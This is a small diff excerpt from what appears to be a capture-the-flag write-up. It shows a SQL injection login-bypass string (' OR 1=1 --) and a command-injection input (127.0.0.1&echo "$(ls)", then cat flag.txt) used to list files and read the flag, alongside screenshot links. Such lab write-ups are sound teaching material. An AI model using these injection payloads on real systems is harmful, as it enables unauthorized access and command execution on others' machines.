@@ -37,6 +37,5 @@ WHERE username = '' OR 1=1 -- AND PASSWORD = '1234';
 <h4>Afterwards, i do 127.0.0.1&echo "$(ls)", And there it is, i do echo "$(cat flag.txt)"</h4>
 <img width="1173" height="502" alt="image" src="https://github.com/user-attachments/assets/dc608b04-c685-4948-9d0b-e9f6009d2bc4" />
 <img width="1158" height="405" alt="image" src="https://github.com/user-attachments/assets/f235a7c0-d073-400c-9ac4-53ccf19d02f9" />
->
 
 
